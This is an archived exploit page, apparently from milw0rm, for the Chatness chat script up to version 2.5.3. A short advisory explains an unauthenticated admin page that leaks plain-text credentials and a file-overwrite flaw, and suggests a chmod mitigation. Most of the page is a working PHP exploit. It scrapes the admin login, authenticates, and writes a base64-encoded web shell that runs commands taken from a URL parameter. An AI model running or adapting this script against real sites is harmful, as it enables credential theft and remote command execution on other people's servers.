<html><head><title>Chatness <= 2.5.3 (options.php/save.php) Remote Code Execution Exploit</title></head><pre>&lt;?/*
Files: options.php, save.php
Affects: Chatness &lt;= 2.5.3
Date: 12th April 2007

Issue Description:
===========================================================================
Chatness suffers with two main vulnerabilities, the first of these in
/admin/options.php the problems occur because the script first fails to
verify if the user is in fact an administrator and secondly it prints the
administrators username and password in plain text as part of the pre-filled
form.

The second issue occurs in /admin/save.php and /index.php while save.php
limits writing to just .html extended filenames it is possible for an
attacker to overwrite either foot.html or head.html to contain arbitrary php
code which would then be executed when included by index.php
===========================================================================

Scope:
===========================================================================
Combined these two seperate issues will allow an attacker to gain access to
the system and execute code/commands of their choice.
===========================================================================

Recommendation:
===========================================================================
Until a patch is availible it would be advisable to chmod both foot.html
and head.html to a mode that makes them unwritable by the web server, this
will minimize the risk of arbitrary code execution.
===========================================================================

Discovered By: Gammarays
*/?&gt;


&lt;?php

echo &quot;########################################################\n&quot;;
echo &quot;#   Special Greetings To - Timq,Warpboy,The-Maggot     #\n&quot;;
echo &quot;########################################################\n\n\n&quot;;

$payload = &quot;JTNDJTNGcGhwK2lmJTI4aXNzZXQlMjglMjRfR0VUJTVCJTI3Y21kJTI3JTVEJTI5JTI5JTdCZWNobytzaGVsbF9leGVjJTI4dXJsZGVjb2RlJTI4JTI0X0dFVCU1QiUyN2NtZCUyNyU1RCUyOSUyOSUzQmRpZSUyOCUyOSUzQiU3RCUzRiUzRQ==&quot;;
$payload = base64_decode($payload);


if($argc!=2) die(&quot;Usage: &lt;url&gt; \n\tEx: http://www.example.com/chatness/\n&quot;);

$url = $argv[1];

$ch = curl_init($url . &quot;admin/options.php&quot;);
if(!$ch) die(&quot;Error Initializing CURL&quot;);

echo &quot;[ ] Attempting To Fetch Admin Login...\n&quot;;
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ch);
if(!$res) die(&quot;Error Connecting To Target&quot;);

$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);
if($httpresult!=200) die(&quot;Error - URL Appears To Be Incorrect&quot;);

//Not good - but it works...sometimes
$junkarray = explode(&quot;id=&quot;,$res);
$junkarray = explode(&quot;\&quot;&quot;,$junkarray[14]);
$username = $junkarray[3];

$junkarray = explode(&quot;id=&quot;,$res);
$junkarray = explode(&quot;\&quot;&quot;,$junkarray[15]);
$password = $junkarray[3];

echo &quot;[ ] Found Username And Password - &quot;.$username.&quot; / &quot;.$password.&quot;\n&quot;;
echo &quot;[ ] Logging In...\n&quot;;

//Login
curl_setopt($ch, CURLOPT_URL,$url . &quot;admin/login.php&quot;);
curl_setopt($ch, CURLOPT_COOKIEJAR, &quot;mrcookie.dat&quot;);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch,
CURLOPT_POSTFIELDS,&quot;user=&quot;.$username.&quot;&amp;pass=&quot;.$password.&quot;&amp;submit=Login&quot;);
$res = curl_exec($ch);
if(!res) die(&quot;Error Connecting To Target&quot;);

$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);
if($httpresult==200) die(&quot;Error Invalid Username/Password&quot;);

echo &quot;[ ] Login Succeeded..\n&quot;;

//Deploy Main Payload
curl_setopt($ch, CURLOPT_URL,$url . &quot;admin/save.php?file=head&quot;);
curl_setopt($ch, CURLOPT_COOKIEFILE, &quot;mrcookie.dat&quot;);
curl_setopt($ch, CURLOPT_POSTFIELDS,&quot;html=&quot;.$payload);
$res = curl_exec($ch);
if(!res) die(&quot;Error Connecting To Target&quot;);

echo &quot;[ ] Payload Deployed\n&quot;;
echo &quot;[ ] Shell Accessible at &quot;.$url.&quot;index.php?cmd=&lt;yourcommand&gt;&quot;;
curl_close($ch);
?&gt;

# milw0rm.com [2007-04-12]</pre></html>